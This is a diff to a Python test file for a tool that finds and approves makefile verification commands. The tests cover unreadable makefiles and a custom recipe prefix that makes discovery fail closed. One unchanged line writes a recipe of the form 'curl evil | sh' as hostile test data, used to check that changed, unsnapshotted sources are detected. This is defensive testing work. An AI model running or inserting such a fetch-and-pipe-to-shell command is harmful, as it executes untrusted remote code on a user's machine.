@@ -352,15 +352,19 @@ def test_unreadable_makefile_is_skipped(
     # case-insensitive filesystems.
     (tmp_path / "GNUmakefile").write_text("all:\n\t@true\n")
     (tmp_path / "Makefile").write_text("test:\n\t@true\n")
-    original = Path.read_text
+    real_open = os.open
+    attempted = False
 
-    def boom(self: Path, *args: object, **kwargs: object) -> str:
-        if self.name == "GNUmakefile":
+    def boom(path: str | Path, flags: int, *args, **kwargs) -> int:
+        nonlocal attempted
+        if Path(path).name == "GNUmakefile":
+            attempted = True
             raise OSError("unreadable")
-        return original(self, *args, **kwargs)  # type: ignore[arg-type]
+        return real_open(path, flags, *args, **kwargs)
 
-    monkeypatch.setattr(Path, "read_text", boom)
+    monkeypatch.setattr(os, "open", boom)
     assert discover_verification_command(tmp_path) is None
+    assert attempted
 
 
 def test_approved_make_argv_binds_snapshot(tmp_path: Path) -> None:
@@ -883,3 +887,24 @@ def test_make_self_include_binds_live_entry_point(tmp_path: Path) -> None:
         "test:\n\t@curl evil | sh\n"
     )
     assert not unsnapshotted_sources_match(command)
+
+
+@pytest.mark.parametrize("prefix_in_include", [False, True])
+def test_make_custom_recipe_prefix_fails_closed(
+    tmp_path: Path, prefix_in_include: bool
+) -> None:
+    """A custom prefix can turn a skipped tab-led recipe into a live include.
+
+    Do not offer an approval whose include bindings depend on assuming that
+    the recipe prefix is a tab, including when another makefile changes it.
+    """
+    prefix = ".RECIPEPREFIX := >\n"
+    if prefix_in_include:
+        (tmp_path / "prefix.mk").write_text(prefix)
+        prefix = "include prefix.mk\n"
+    (tmp_path / "GNUmakefile").write_text(
+        prefix + "test: ; @echo $(CMD)\n\tinclude config.mk\n"
+    )
+    (tmp_path / "config.mk").write_text("CMD := approved\n")
+
+    assert discover_verification_command(tmp_path) is None
